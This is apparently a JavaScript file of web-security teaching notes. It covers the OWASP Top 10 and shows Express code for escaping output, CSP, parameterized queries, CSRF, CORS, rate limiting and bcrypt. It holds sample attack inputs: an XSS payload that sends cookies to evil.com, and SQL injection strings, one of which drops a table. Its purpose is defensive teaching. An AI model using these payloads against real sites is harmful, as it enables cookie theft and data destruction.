// ============================================
// WEB SECURITY — OWASP & BEST PRACTICES
// ============================================
// npm install helmet cors bcrypt express-rate-limit

// ---- 1. OWASP TOP 10 OVERVIEW ----

const owaspTop10 = `
  1. Broken Access Control         — Missing auth checks
  2. Cryptographic Failures        — Weak encryption, exposed secrets
  3. Injection                     — SQL injection, XSS
  4. Insecure Design               — Missing security architecture
  5. Security Misconfiguration     — Default settings, exposed errors
  6. Vulnerable Components         — Outdated dependencies
  7. Auth Failures                 — Weak passwords, no MFA
  8. Data Integrity Failures       — Unsigned updates, untrusted data
  9. Logging & Monitoring Failures — No audit trail
  10. SSRF                         — Server-side request forgery
`;

// ---- 2. XSS (Cross-Site Scripting) ----

const xssPrevention = `
// ===== TYPES =====
// Reflected XSS: malicious script in URL → rendered in page
// Stored XSS: malicious script saved to DB → served to users
// DOM XSS: client-side JS inserts untrusted data into DOM

// ===== EXAMPLE: Vulnerable Code =====
// ❌ DANGEROUS
app.get('/search', (req, res) => {
  res.send(\`<h1>Results for: \${req.query.q}</h1>\`);
  // URL: /search?q=<script>document.location='http://evil.com/steal?c='+document.cookie</script>
});

// ===== PREVENTION =====

// 1. Escape HTML output
const escapeHtml = (str) => {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
};

// ✅ SAFE
app.get('/search', (req, res) => {
  res.send(\`<h1>Results for: \${escapeHtml(req.query.q)}</h1>\`);
});

// 2. Content Security Policy (CSP)
const helmet = require('helmet');
app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'"],           // no inline scripts
    styleSrc: ["'self'", "'unsafe-inline'"],
    imgSrc: ["'self'", 'data:', 'https:'],
    connectSrc: ["'self'", 'https://api.example.com'],
    frameSrc: ["'none'"],            // no iframes
    objectSrc: ["'none'"],
  },
}));

// 3. React automatically escapes JSX (safe by default)
// ❌ DANGEROUS: dangerouslySetInnerHTML
// ✅ SAFE: {userInput} in JSX is auto-escaped

// 4. Use DOMPurify for user-generated HTML
// import DOMPurify from 'dompurify';
// const clean = DOMPurify.sanitize(dirtyHtml);
`;

// ---- 3. SQL INJECTION ----

const sqlInjection = `
// ===== VULNERABLE =====
// ❌ String concatenation with user input
app.get('/users', (req, res) => {
  const query = "SELECT * FROM users WHERE name = '" + req.query.name + "'";
  // Input: ' OR '1'='1' -- → returns ALL users
  // Input: '; DROP TABLE users; -- → deletes table!
});

// ===== PREVENTION =====

// 1. Parameterized queries (pg module)
const { Pool } = require('pg');
const pool = new Pool();

app.get('/users', async (req, res) => {
  // ✅ SAFE: parameterized query
  const result = await pool.query(
    'SELECT * FROM users WHERE name = $1',
    [req.query.name]  // parameters are escaped automatically
  );
  res.json(result.rows);
});

// 2. ORMs (Prisma, Mongoose) — safe by default
const user = await prisma.user.findMany({
  where: { name: req.query.name },  // automatically parameterized
});

// 3. Input validation
const { z } = require('zod');
const searchSchema = z.object({
  name: z.string().max(100).regex(/^[a-zA-Z\\s]+$/),
});
`;

// ---- 4. CSRF (Cross-Site Request Forgery) ----

const csrfPrevention = `
// Attack: malicious site makes requests on behalf of logged-in user

// ===== PREVENTION =====

// 1. SameSite cookies (most important)
app.use(session({
  cookie: {
    httpOnly: true,      // not accessible via JS
    secure: true,        // HTTPS only
    sameSite: 'strict',  // not sent with cross-site requests
    maxAge: 24 * 60 * 60 * 1000,
  },
}));

// 2. CSRF tokens (for traditional forms)
const csrf = require('csurf');
const csrfProtection = csrf({ cookie: true });

app.get('/form', csrfProtection, (req, res) => {
  res.render('form', { csrfToken: req.csrfToken() });
});

// In form: <input type="hidden" name="_csrf" value="<%= csrfToken %>">

// 3. For SPAs with JWT: tokens in Authorization header (not cookies)
//    are immune to CSRF since the attacker can't read the token
`;

// ---- 5. CORS ----

const corsConfig = `
const cors = require('cors');

// ===== Permissive (development) =====
app.use(cors());  // allows all origins

// ===== Restrictive (production) =====
app.use(cors({
  origin: ['https://myapp.com', 'https://admin.myapp.com'],
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  credentials: true,  // allow cookies
  maxAge: 86400,       // preflight cache: 24 hours
}));

// ===== Dynamic origin =====
const allowedOrigins = ['https://myapp.com', 'https://staging.myapp.com'];
app.use(cors({
  origin: (origin, callback) => {
    if (!origin || allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  },
}));
`;

// ---- 6. RATE LIMITING ----

const rateLimiting = `
const rateLimit = require('express-rate-limit');

// General rate limit
const generalLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,  // 15 minutes
  max: 100,                    // 100 requests per window
  message: { error: 'Too many requests, try again later' },
  standardHeaders: true,
  legacyHeaders: false,
});
app.use('/api', generalLimiter);

// Strict rate limit for auth endpoints
const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5,  // 5 login attempts per 15 min
  message: { error: 'Too many login attempts' },
});
app.use('/api/auth/login', authLimiter);
`;

// ---- 7. PASSWORD HASHING ----

const passwordHashing = `
const bcrypt = require('bcrypt');
const SALT_ROUNDS = 12;

// ===== Hash password =====
async function hashPassword(password) {
  return bcrypt.hash(password, SALT_ROUNDS);
}

// ===== Verify password =====
async function verifyPassword(password, hash) {
  return bcrypt.compare(password, hash);
}

// ===== Registration =====
app.post('/api/auth/register', async (req, res) => {
  const { email, password } = req.body;
  const hashedPassword = await hashPassword(password);
  const user = await db.createUser({ email, password: hashedPassword });
  res.status(201).json({ id: user.id, email: user.email });
});

// ===== Login =====
app.post('/api/auth/login', async (req, res) => {
  const { email, password } = req.body;
  const user = await db.findUserByEmail(email);

  if (!user || !(await verifyPassword(password, user.password))) {
    return res.status(401).json({ error: 'Invalid credentials' });
    // Don't reveal whether email exists!
  }

  const token = jwt.sign({ userId: user.id }, process.env.JWT_SECRET);
  res.json({ token });
});
`;

// ---- 8. HELMET.JS (Security Headers) ----

const helmetSetup = `
const helmet = require('helmet');

app.use(helmet());  // sets many secure headers:
// X-Content-Type-Options: nosniff
// X-Frame-Options: DENY
// X-XSS-Protection: 0
// Strict-Transport-Security (HSTS)
// Content-Security-Policy
// Referrer-Policy
// Permissions-Policy
`;

// ---- 9. ENVIRONMENT VARIABLES ----

const envSecurity = `
// .env (NEVER commit this file!)
DATABASE_URL=postgresql://user:pass@localhost:5432/mydb
JWT_SECRET=super_long_random_string_here_at_least_32_chars
AWS_ACCESS_KEY=AKIAIOSFODNN7EXAMPLE
STRIPE_SECRET_KEY=sk_test_...

// .env.example (commit this as template)
DATABASE_URL=
JWT_SECRET=
AWS_ACCESS_KEY=
STRIPE_SECRET_KEY=

// .gitignore
.env
.env.local
.env.production

// Access in code
const dbUrl = process.env.DATABASE_URL;
if (!process.env.JWT_SECRET) {
  throw new Error('JWT_SECRET is required');
}
`;

console.log("=== Web Security Checklist ===");
console.log(`
  ✅ Helmet.js for security headers
  ✅ CORS properly configured
  ✅ Rate limiting on auth routes
  ✅ Parameterized queries (no SQL injection)
  ✅ Input validation (Zod/Joi)
  ✅ XSS prevention (escape output, CSP)
  ✅ CSRF protection (SameSite cookies)
  ✅ bcrypt for password hashing (12+ rounds)
  ✅ HTTPS in production
  ✅ Secrets in environment variables
  ✅ Dependencies updated (npm audit)
  ✅ Error messages don't leak internals
`);
